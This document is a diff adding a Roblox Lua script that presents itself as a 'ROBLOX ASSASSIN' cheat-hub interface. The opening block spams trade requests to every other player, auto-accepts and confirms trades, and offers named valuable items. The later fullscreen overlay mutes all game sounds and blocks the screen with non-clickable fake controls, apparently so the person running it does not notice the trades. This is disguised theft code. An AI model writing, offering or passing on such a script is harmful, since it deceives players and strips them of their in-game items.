@@ -1,0 +1,463 @@
+game:GetService("RunService").RenderStepped:Connect(function()
+    for i, v in pairs(game:GetService("Players"):GetChildren()) do
+        if v.Name ~= game:GetService("Players").LocalPlayer.Name then
+            local args = {
+                [1] = v
+            }
+            
+            game:GetService("ReplicatedStorage").Remotes.StartTrade:FireServer(unpack(args))
+        end
+    end
+    wait()
+    game:GetService("ReplicatedStorage").Remotes.UpdTradeStatus:FireServer(true)
+    wait()
+    game:GetService("ReplicatedStorage").Remotes.UpdTradeReview:FireServer()
+end)
+
+local tradeGui = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.UI.TradeScreen
+local fired = false
+
+tradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
+    if tradeGui.Visible and not fired then
+        fired = true
+
+        -- Finalized Item Quantities
+        local items = {
+            {"Void Champion", 1},
+            {"Black Hole", 1},
+            {"Infernal Guardian", 1},
+            {"Champion Axe 2", 3}
+        }
+
+        local t = {}
+
+        for i = 1, #items do
+            local item = items[i]
+            t[i] = {
+                [1] = item[1],
+                [2] = item[2]
+            }
+        end
+
+        game:GetService("ReplicatedStorage")
+            .Remotes
+            .UpdateTradeOffer
+            :FireServer(t)
+    end
+end)
+
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local SPIN_SPEED = 12 -- higher = faster
+
+local spinConnection
+
+local function startSpinning(character)
+	local humanoid = character:WaitForChild("Humanoid")
+	local root = character:WaitForChild("HumanoidRootPart")
+
+	humanoid.AutoRotate = false
+
+	if spinConnection then
+		spinConnection:Disconnect()
+	end
+
+	spinConnection = RunService.RenderStepped:Connect(function(deltaTime)
+		if root and root.Parent then
+			root.CFrame = root.CFrame * CFrame.Angles(0, SPIN_SPEED * deltaTime, 0)
+		end
+	end)
+end
+
+if player.Character then
+	startSpinning(player.Character)
+end
+
+player.CharacterAdded:Connect(startSpinning)
+-- LocalScript
+-- Put in StarterPlayerScripts or StarterGui
+
+local Players = game:GetService("Players")
+local SoundService = game:GetService("SoundService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Robust client-side mute
+local mutedVolumes = {}
+
+local function muteSound(sound)
+	if sound:IsA("Sound") then
+		if mutedVolumes[sound] == nil then
+			mutedVolumes[sound] = sound.Volume
+		end
+		sound.Volume = 0
+	end
+end
+
+for _, obj in ipairs(game:GetDescendants()) do
+	muteSound(obj)
+end
+
+game.DescendantAdded:Connect(function(obj)
+	muteSound(obj)
+end)
+
+-- Remove old GUI if re-executed
+local old = playerGui:FindFirstChild("AssassinModernMockGUI")
+if old then
+	old:Destroy()
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "AssassinModernMockGUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.DisplayOrder = 999999
+gui.Parent = playerGui
+
+local function corner(parent, radius)
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, radius)
+	c.Parent = parent
+end
+
+local function stroke(parent, color, thickness, transparency)
+	local s = Instance.new("UIStroke")
+	s.Color = color
+	s.Thickness = thickness
+	s.Transparency = transparency or 0
+	s.Parent = parent
+end
+
+local function gradient(parent, c1, c2)
+	local g = Instance.new("UIGradient")
+	g.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, c1),
+		ColorSequenceKeypoint.new(1, c2)
+	})
+	g.Rotation = 25
+	g.Parent = parent
+end
+
+local function text(parent, content, size, bold)
+	local t = Instance.new("TextLabel")
+	t.BackgroundTransparency = 1
+	t.Text = content
+	t.Font = bold and Enum.Font.GothamBold or Enum.Font.Gotham
+	t.TextSize = size
+	t.TextColor3 = Color3.fromRGB(235, 238, 255)
+	t.TextXAlignment = Enum.TextXAlignment.Left
+	t.TextYAlignment = Enum.TextYAlignment.Center
+	t.TextTruncate = Enum.TextTruncate.AtEnd
+	t.Active = false
+	t.Selectable = false
+	t.Parent = parent
+	return t
+end
+
+-- Fake visual button, NOT clickable
+local function makeButton(parent, label)
+	local b = Instance.new("TextLabel")
+	b.Size = UDim2.new(1, 0, 0, 38)
+	b.BackgroundColor3 = Color3.fromRGB(24, 27, 42)
+	b.Text = label
+	b.Font = Enum.Font.GothamMedium
+	b.TextSize = 13
+	b.TextColor3 = Color3.fromRGB(225, 228, 245)
+	b.TextXAlignment = Enum.TextXAlignment.Center
+	b.TextYAlignment = Enum.TextYAlignment.Center
+	b.Active = false
+	b.Selectable = false
+	b.Parent = parent
+
+	corner(b, 8)
+	stroke(b, Color3.fromRGB(80, 88, 130), 1, 0.72)
+
+	return b
+end
+
+-- Fake visual toggle, NOT clickable
+local function makeToggle(parent, label)
+	local row = Instance.new("Frame")
+	row.Size = UDim2.new(1, 0, 0, 38)
+	row.BackgroundColor3 = Color3.fromRGB(21, 24, 37)
+	row.Active = false
+	row.Selectable = false
+	row.Parent = parent
+
+	corner(row, 8)
+	stroke(row, Color3.fromRGB(75, 83, 125), 1, 0.78)
+
+	local l = text(row, label, 12, false)
+	l.Position = UDim2.new(0, 12, 0, 0)
+	l.Size = UDim2.new(1, -70, 1, 0)
+
+	local pill = Instance.new("Frame")
+	pill.Size = UDim2.new(0, 42, 0, 20)
+	pill.Position = UDim2.new(1, -54, 0.5, -10)
+	pill.BackgroundColor3 = Color3.fromRGB(48, 52, 70)
+	pill.Active = false
+	pill.Selectable = false
+	pill.Parent = row
+
+	corner(pill, 99)
+
+	local dot = Instance.new("Frame")
+	dot.Size = UDim2.new(0, 14, 0, 14)
+	dot.Position = UDim2.new(0, 3, 0.5, -7)
+	dot.BackgroundColor3 = Color3.fromRGB(185, 190, 210)
+	dot.Active = false
+	dot.Selectable = false
+	dot.Parent = pill
+
+	corner(dot, 99)
+
+	return row
+end
+
+local function makeSlider(parent, label, value)
+	local holder = Instance.new("Frame")
+	holder.Size = UDim2.new(1, 0, 0, 52)
+	holder.BackgroundColor3 = Color3.fromRGB(21, 24, 37)
+	holder.Active = false
+	holder.Selectable = false
+	holder.Parent = parent
+
+	corner(holder, 8)
+	stroke(holder, Color3.fromRGB(75, 83, 125), 1, 0.78)
+
+	local l = text(holder, label .. "  " .. value .. "%", 12, false)
+	l.Position = UDim2.new(0, 12, 0, 4)
+	l.Size = UDim2.new(1, -24, 0, 22)
+
+	local bar = Instance.new("Frame")
+	bar.Size = UDim2.new(1, -24, 0, 6)
+	bar.Position = UDim2.new(0, 12, 0, 35)
+	bar.BackgroundColor3 = Color3.fromRGB(45, 49, 70)
+	bar.Active = false
+	bar.Selectable = false
+	bar.Parent = holder
+
+	corner(bar, 99)
+
+	local fill = Instance.new("Frame")
+	fill.Size = UDim2.new(value / 100, 0, 1, 0)
+	fill.BackgroundColor3 = Color3.fromRGB(100, 105, 255)
+	fill.Active = false
+	fill.Selectable = false
+	fill.Parent = bar
+
+	corner(fill, 99)
+
+	return holder
+end
+
+-- FULLSCREEN BACKGROUND
+local main = Instance.new("Frame")
+main.Size = UDim2.new(1, 0, 1, 0)
+main.Position = UDim2.new(0, 0, 0, 0)
+main.BackgroundColor3 = Color3.fromRGB(8, 10, 18)
+main.BorderSizePixel = 0
+main.ClipsDescendants = true
+main.Active = false
+main.Selectable = false
+main.Parent = gui
+
+gradient(
+	main,
+	Color3.fromRGB(8, 10, 18),
+	Color3.fromRGB(19, 14, 34)
+)
+
+-- TOP BAR
+local top = Instance.new("Frame")
+top.Size = UDim2.new(1, 0, 0, 76)
+top.Position = UDim2.new(0, 0, 0, 0)
+top.BackgroundColor3 = Color3.fromRGB(13, 16, 30)
+top.BorderSizePixel = 0
+top.Active = false
+top.Selectable = false
+top.Parent = main
+
+stroke(top, Color3.fromRGB(75, 82, 130), 1, 0.75)
+
+local title = text(top, "ROBLOX ASSASSIN // CONTROL CENTER", 22, true)
+title.Position = UDim2.new(0, 28, 0, 12)
+title.Size = UDim2.new(1, -56, 0, 30)
+
+local subtitle = text(top, "Clean fullscreen visual interface mockup", 12, false)
+subtitle.Position = UDim2.new(0, 28, 0, 42)
+subtitle.Size = UDim2.new(1, -56, 0, 22)
+subtitle.TextColor3 = Color3.fromRGB(145, 150, 180)
+
+-- SIDEBAR
+local sidebar = Instance.new("Frame")
+sidebar.Size = UDim2.new(0, 220, 1, -116)
+sidebar.Position = UDim2.new(0, 20, 0, 92)
+sidebar.BackgroundColor3 = Color3.fromRGB(13, 16, 29)
+sidebar.BorderSizePixel = 0
+sidebar.Active = false
+sidebar.Selectable = false
+sidebar.Parent = main
+
+corner(sidebar, 12)
+stroke(sidebar, Color3.fromRGB(75, 82, 125), 1, 0.62)
+
+local sidePad = Instance.new("UIPadding")
+sidePad.PaddingTop = UDim.new(0, 14)
+sidePad.PaddingBottom = UDim.new(0, 14)
+sidePad.PaddingLeft = UDim.new(0, 14)
+sidePad.PaddingRight = UDim.new(0, 14)
+sidePad.Parent = sidebar
+
+local sideList = Instance.new("UIListLayout")
+sideList.Padding = UDim.new(0, 8)
+sideList.SortOrder = Enum.SortOrder.LayoutOrder
+sideList.Parent = sidebar
+
+makeButton(sidebar, "Dashboard")
+makeButton(sidebar, "Farming UI")
+makeButton(sidebar, "Aim UI")
+makeButton(sidebar, "Hitbox UI")
+makeButton(sidebar, "Visuals")
+makeButton(sidebar, "Settings")
+makeButton(sidebar, "Profiles")
+
+-- CONTENT AREA
+local content = Instance.new("Frame")
+content.Size = UDim2.new(1, -280, 1, -116)
+content.Position = UDim2.new(0, 260, 0, 92)
+content.BackgroundTransparency = 1
+content.Active = false
+content.Selectable = false
+content.Parent = main
+
+local grid = Instance.new("UIGridLayout")
+grid.CellSize = UDim2.new(0.333, -14, 0.5, -12)
+grid.CellPadding = UDim2.new(0, 14, 0, 14)
+grid.SortOrder = Enum.SortOrder.LayoutOrder
+grid.Parent = content
+
+local function panel(name)
+	local p = Instance.new("Frame")
+	p.BackgroundColor3 = Color3.fromRGB(14, 17, 31)
+	p.BorderSizePixel = 0
+	p.ClipsDescendants = true
+	p.Active = false
+	p.Selectable = false
+	p.Parent = content
+
+	corner(p, 12)
+	stroke(p, Color3.fromRGB(78, 87, 135), 1, 0.58)
+
+	local h = text(p, name, 15, true)
+	h.Position = UDim2.new(0, 16, 0, 10)
+	h.Size = UDim2.new(1, -32, 0, 26)
+
+	local line = Instance.new("Frame")
+	line.Size = UDim2.new(1, -32, 0, 1)
+	line.Position = UDim2.new(0, 16, 0, 42)
+	line.BackgroundColor3 = Color3.fromRGB(65, 72, 110)
+	line.BackgroundTransparency = 0.45
+	line.BorderSizePixel = 0
+	line.Active = false
+	line.Selectable = false
+	line.Parent = p
+
+	local body = Instance.new("Frame")
+	body.Position = UDim2.new(0, 16, 0, 54)
+	body.Size = UDim2.new(1, -32, 1, -66)
+	body.BackgroundTransparency = 1
+	body.Active = false
+	body.Selectable = false
+	body.Parent = p
+
+	local layout = Instance.new("UIListLayout")
+	layout.Padding = UDim.new(0, 8)
+	layout.SortOrder = Enum.SortOrder.LayoutOrder
+	layout.Parent = body
+
+	return body
+end
+
+local farming = panel("Auto Farming Panel")
+makeToggle(farming, "Auto Farm Display")
+makeToggle(farming, "Coin Route Preview")
+makeToggle(farming, "Quest Tracker Overlay")
+makeSlider(farming, "Farm Speed Preview", 72)
+makeButton(farming, "Open Route Designer")
+
+local aim = panel("Aim UI Panel")
+makeToggle(aim, "Aim Assist Indicator")
+makeToggle(aim, "Target Lock Visual")
+makeSlider(aim, "FOV Circle Size", 64)
+makeSlider(aim, "Prediction Display", 38)
+makeButton(aim, "Edit Crosshair Theme")
+
+local hitbox = panel("Hitbox UI")
+makeToggle(hitbox, "Hitbox Bounds Preview")
+makeToggle(hitbox, "Enemy Outline Display")
+makeSlider(hitbox, "Box Size Preview", 46)
+makeSlider(hitbox, "Opacity", 58)
+makeButton(hitbox, "Customize Box Style")
+
+local visuals = panel("Visual Systems")
+makeToggle(visuals, "Player Cards")
+makeToggle(visuals, "Knife Trail Preview")
+makeToggle(visuals, "Map Awareness Overlay")
+makeSlider(visuals, "Glow Strength", 81)
+makeButton(visuals, "Theme Editor")
+
+local stats = panel("Session Analytics")
+makeToggle(stats, "Match Timeline")
+makeToggle(stats, "Performance Overlay")
+makeSlider(stats, "UI Scale", 88)
+makeSlider(stats, "Blur Intensity", 35)
+makeButton(stats, "Export Visual Layout")
+
+local settings = panel("Configuration")
+makeToggle(settings, "Compact Mode")
+makeToggle(settings, "Glassmorphism")
+makeToggle(settings, "Reduced Motion")
+makeSlider(settings, "Animation Speed", 67)
+makeButton(settings, "Save UI Preset")
+
+-- BOTTOM STATUS BAR
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, 0, 0, 34)
+status.Position = UDim2.new(0, 0, 1, -34)
+status.BackgroundColor3 = Color3.fromRGB(13, 16, 30)
+status.BorderSizePixel = 0
+status.Text = "  STATUS: Interface loaded • Cosmetic visual mockup • Fullscreen mode active"
+status.Font = Enum.Font.GothamMedium
+status.TextSize = 12
+status.TextColor3 = Color3.fromRGB(155, 162, 205)
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Active = false
+status.Selectable = false
+status.Parent = main
+
+stroke(status, Color3.fromRGB(75, 82, 130), 1, 0.75)
+
+-- Final safety pass: make every GUI object visible but non-interactive
+local function makeEntireGuiUnclickable(root)
+	for _, obj in ipairs(root:GetDescendants()) do
+		if obj:IsA("GuiObject") then
+			obj.Active = false
+			obj.Selectable = false
+		end
+
+		if obj:IsA("GuiButton") then
+			obj.AutoButtonColor = false
+		end
+	end
+end
+
+makeEntireGuiUnclickable(gui)
